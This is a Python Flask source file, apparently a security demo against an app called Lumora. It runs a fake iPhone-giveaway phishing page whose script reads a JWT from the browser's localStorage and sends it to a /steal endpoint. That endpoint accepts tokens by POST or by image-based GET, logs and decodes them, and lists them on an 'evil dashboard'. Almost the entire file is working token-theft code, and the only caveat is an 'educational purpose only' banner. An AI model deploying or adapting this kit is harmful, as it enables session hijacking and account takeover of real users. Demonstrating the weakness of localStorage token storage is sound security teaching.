"""
REAL JWT Token Theft via Browser
Browser console'dan token çalma simülasyonu
"""

from flask import Flask, request, jsonify
from flask_cors import CORS
from colorama import init, Fore, Style
import time
from datetime import datetime

init()

app = Flask(__name__)
CORS(app)  # Allow cross-origin requests

# Store stolen tokens
stolen_tokens = []

@app.route('/')
def home():
    """Evil webpage that steals tokens"""
    return """
<!DOCTYPE html>
<html>
<head>
    <title>🎁 FREE IPHONE GIVEAWAY!</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            text-align: center;
            padding: 50px;
        }
        .container {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 20px;
            padding: 40px;
            max-width: 600px;
            margin: 0 auto;
            backdrop-filter: blur(10px);
        }
        h1 { font-size: 3em; margin: 0; }
        .gift { font-size: 5em; }
        button {
            background: #ff6b6b;
            color: white;
            border: none;
            padding: 20px 40px;
            font-size: 1.5em;
            border-radius: 50px;
            cursor: pointer;
            margin-top: 30px;
            box-shadow: 0 10px 20px rgba(0,0,0,0.3);
        }
        button:hover {
            background: #ff5252;
            transform: scale(1.05);
        }
        #result {
            margin-top: 30px;
            font-size: 1.2em;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="gift">🎁</div>
        <h1>CONGRATULATIONS!</h1>
        <p style="font-size: 1.5em;">You've been selected to win a FREE iPhone 15 Pro!</p>
        <p>Click below to claim your prize!</p>
        
        <button onclick="stealToken()">CLAIM NOW!</button>
        
        <div id="result"></div>
    </div>

    <script>
        function stealToken() {
            // Try to steal token from localStorage
            const token = localStorage.getItem('auth_token');  // Frontend uses 'auth_token'
            
            const resultDiv = document.getElementById('result');
            
            if (token) {
                // Send stolen token to evil server
                fetch('http://localhost:5001/steal', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ 
                        token: token,
                        timestamp: new Date().toISOString(),
                        userAgent: navigator.userAgent
                    })
                })
                .then(response => response.json())
                .then(data => {
                    resultDiv.innerHTML = '<span style="color: #ff6b6b; font-weight: bold;">🔴 TOKEN STOLEN!</span><br>' +
                                         'Check evil server logs!';
                    
                    // Show decoded token info
                    const payload = JSON.parse(atob(token.split('.')[1]));
                    console.log('🔴 STOLEN TOKEN:', token);
                    console.log('🔴 USER ID:', payload.sub);
                    console.log('🔴 EXPIRES:', new Date(payload.exp * 1000));
                });
            } else {
                resultDiv.innerHTML = '<span style="color: yellow;">⚠️ No token found!</span><br>' +
                                     'User is not logged in to Lumora.';
            }
        }
        
        // Auto-steal if token exists
        setTimeout(() => {
            const token = localStorage.getItem('auth_token');  // Frontend uses 'auth_token'
            if (token) {
                console.log('🔴 Found token in localStorage!');
                console.log('🔴 Token preview:', token.substring(0, 50) + '...');
            }
        }, 1000);
    </script>
</body>
</html>
"""

@app.route('/steal', methods=['POST', 'GET'])
def steal_token():
    """Receive stolen tokens"""
    # Support both POST (JSON) and GET (query params for image-based theft)
    if request.method == 'GET':
        token = request.args.get('token')
        user_agent = request.headers.get('User-Agent', 'Unknown')
    else:
        data = request.json
        token = data.get('token')
        user_agent = data.get('userAgent', request.headers.get('User-Agent', 'Unknown'))
    
    if token:
        stolen_tokens.append({
            'token': token,
            'timestamp': datetime.now().isoformat(),
            'user_agent': user_agent,
            'ip': request.remote_addr,
            'method': request.method
        })
        
        print(f"\n{Fore.RED}{'=' * 70}{Style.RESET_ALL}")
        print(f"{Fore.RED}🔴 JWT TOKEN STOLEN ({request.method})!{Style.RESET_ALL}")
        print(f"{Fore.RED}{'=' * 70}{Style.RESET_ALL}\n")
        
        print(f"Token: {token[:50]}...")
        print(f"Time: {datetime.now()}")
        print(f"User-Agent: {user_agent}")
        print(f"Method: {request.method}")
        print(f"Total stolen: {len(stolen_tokens)}\n")
        
        # Decode token
        try:
            import jwt
            payload = jwt.decode(token, options={"verify_signature": False})
            print(f"Decoded Payload:")
            print(f"  User ID: {payload.get('sub')}")
            print(f"  Expires: {datetime.fromtimestamp(payload.get('exp'))}")
            print()
        except:
            pass
        
        # Return 1x1 transparent GIF for image requests
        if request.method == 'GET':
            from flask import make_response
            response = make_response(bytes.fromhex('47494638396101000100800000000000ffffff21f90401000000002c00000000010001000002024401003b'))
            response.headers['Content-Type'] = 'image/gif'
            return response
        
        return jsonify({"status": "stolen", "count": len(stolen_tokens)})
    
    return jsonify({"status": "failed"}), 400

@app.route('/dashboard')
def dashboard():
    """Show stolen tokens"""
    html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>🔴 Evil Dashboard</title>
    <style>
        body {{
            font-family: monospace;
            background: #1a1a1a;
            color: #0f0;
            padding: 20px;
        }}
        h1 {{ color: #f00; }}
        .token {{
            background: #2a2a2a;
            padding: 15px;
            margin: 10px 0;
            border-left: 4px solid #f00;
        }}
        .count {{ font-size: 2em; color: #f00; }}
    </style>
</head>
<body>
    <h1>🔴 STOLEN TOKENS DASHBOARD</h1>
    <p class="count">Total Stolen: {len(stolen_tokens)}</p>
    <hr>
"""
    
    for i, item in enumerate(stolen_tokens, 1):
        html += f"""
    <div class="token">
        <strong>Token #{i}</strong><br>
        Time: {item['timestamp']}<br>
        Token: {item['token'][:80]}...<br>
        User-Agent: {item['user_agent']}<br>
        IP: {item['ip']}
    </div>
"""
    
    html += "</body></html>"
    return html

if __name__ == "__main__":
    print(f"{Fore.RED}")
    print("╔═══════════════════════════════════════════════════════╗")
    print("║   🔴 EVIL TOKEN STEALER SERVER                       ║")
    print("╠═══════════════════════════════════════════════════════╣")
    print("║  Evil Page: http://localhost:5001                     ║")
    print("║  Dashboard: http://localhost:5001/dashboard           ║")
    print("║                                                       ║")
    print("║  ⚠️  SECURITY DEMO - Educational purpose only!       ║")
    print("╚═══════════════════════════════════════════════════════╝")
    print(f"{Style.RESET_ALL}\n")
    
    print(f"{Fore.YELLOW}Demo Scenario:{Style.RESET_ALL}")
    print("1. User logs into Lumora (http://localhost:3000)")
    print("2. User visits evil page (http://localhost:5001)")
    print("3. Evil page steals token from localStorage")
    print("4. Token sent to this server")
    print("5. Attacker can now use token!\n")
    
    print(f"{Fore.CYAN}Starting evil server...{Style.RESET_ALL}\n")
    
    app.run(host='0.0.0.0', port=5001, debug=False)
